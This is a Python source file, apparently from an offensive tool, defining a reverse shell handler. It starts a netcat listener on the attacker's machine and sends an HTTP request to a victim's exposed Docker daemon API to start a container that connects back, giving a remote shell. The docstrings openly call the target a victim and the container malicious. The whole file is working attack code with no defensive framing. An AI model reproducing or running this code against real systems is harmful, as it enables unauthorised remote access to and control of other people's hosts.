import requests
import rich
import subprocess

from redex.utils.thread import Threading
from typing import Dict


class ReverseShellHandler(object):
    """**Reverse Shell Handler**

    Starts a reverse shell on the victim machine by placing/starting
    a malicious container on the victim host, exploiting the exposed
    Docker Daemon on TCP connections. In the meantime, the local host
    is running NETCAT to listen for all incoming connections.

    Attributes
    ----------
    console : rich.console.Console
        The handler to the rich console to print out some information
    lhost : str
        The local host address
    lport : int
        The port on which NETCAT will listen for incoming connection
    """
    def __init__(
        self, console: rich.console.Console, lhost: str, lport: int
    ) -> None:
        self.console = console
        self.console.print(f"[*] Starting Reverse Shell Handler on {lhost}:{lport}")

        self.lhost = lhost
        self.lport = lport

    def handle_rv(
        self, exec_start: Dict[str, bool], addr: str, exec_id: str
    ) -> None:
        """
        Start the actual handler by running the NETCAT command to listen on 
        a specific port for incoming connection. Then, it sends an http requests 
        to the remote docker deamon to create a container that will connect to 
        the attacker host.

        Parameters
        ----------
        exec_start : Dict[str, bool]
            A JSON with containing the request for the Docker Daemon.
        addr : str
            The address of the victim machine
        exec_id : int
            The execution ID of the new container on the victim docker
        """
        try:
            # Start NETCAT on listening mode
            remote_shell_process = Threading.run_single_thread(
                function=subprocess.run,
                args=(['/bin/bash', '-c', f'nc -lvp {self.lport}'])
            )

            # Make the request to the docker daemon to start a new container
            response = requests.post(
                f"http://{addr}/exec/{exec_id}/start", json=exec_start)
        except KeyboardInterrupt: ...

        self.console.print("[*] Connection Closing ... ", style="yellow")